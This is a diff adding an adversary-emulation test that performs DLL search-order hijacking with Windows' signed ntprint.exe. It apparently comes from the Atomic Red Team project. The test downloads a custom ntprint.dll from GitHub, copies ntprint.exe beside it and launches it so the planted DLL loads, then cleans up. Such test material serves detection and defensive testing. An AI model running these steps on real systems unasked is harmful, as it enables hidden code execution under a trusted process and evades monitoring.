@@ -158,3 +158,35 @@ atomic_tests:
       Write-Host 2.KeyScrambler cleanup completed successfully.
     name: powershell
     elevation_required: true
+- name: DLL Search Order Hijacking - ntprint
+  description: |-
+    This technique abuses the legitimate, Microsoft-signed ntprint.exe as a living-off-the-land loader by copying it out of C:\Windows\System32 into a user-controlled directory and launching it with the next command-line PSetupElevatedLegacyPrintDriverInstallW, which causes the process to attempt to load ntprint.dll; due to Windows DLL search behavior, placing a malicious ntprint.dll in the same directory results in that DLL being loaded alongside the trusted binary, providing code execution inside a seemingly benign Windows component and blending activity under a signed process name (a classic DLL sideloading/search-order hijack pattern)
+    Reference: https://www.hexacorn.com/blog/2025/10/06/ntprint-exe-lolbin/
+  supported_platforms:
+    - windows
+  input_arguments:
+    ntprint_dll_file:
+      type: path
+      default: PathToAtomicsFolder\T1574.001\bin\ntprint.dll
+      description: ntprint.dll custom
+  dependency_executor_name: powershell
+  dependencies:
+    - description: ntprint.dll must exist on disk at specified location (#{ntprint_dll_file})
+      prereq_command: |
+        if (Test-Path "#{ntprint_dll_file}") {exit 0} else {exit 1}
+      get_prereq_command: |-
+        New-Item -Type Directory (split-path "#{ntprint_dll_file}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/ntprint.dll?raw=true" -OutFile "#{ntprint_dll_file}"
+  executor:
+    command: |-
+      mkdir "%USERPROFILE%\atomic"
+      cd "%USERPROFILE%\atomic"
+      copy "#{ntprint_dll_file}" .
+      copy /y C:\Windows\System32\ntprint.exe .
+      ntprint.exe PSetupElevatedLegacyPrintDriverInstallW {}
+    cleanup_command: |-
+      cd "%USERPROFILE%"
+      rmdir /s /q "%USERPROFILE%\atomic"
+    name: command_prompt
+    elevation_required: true
+
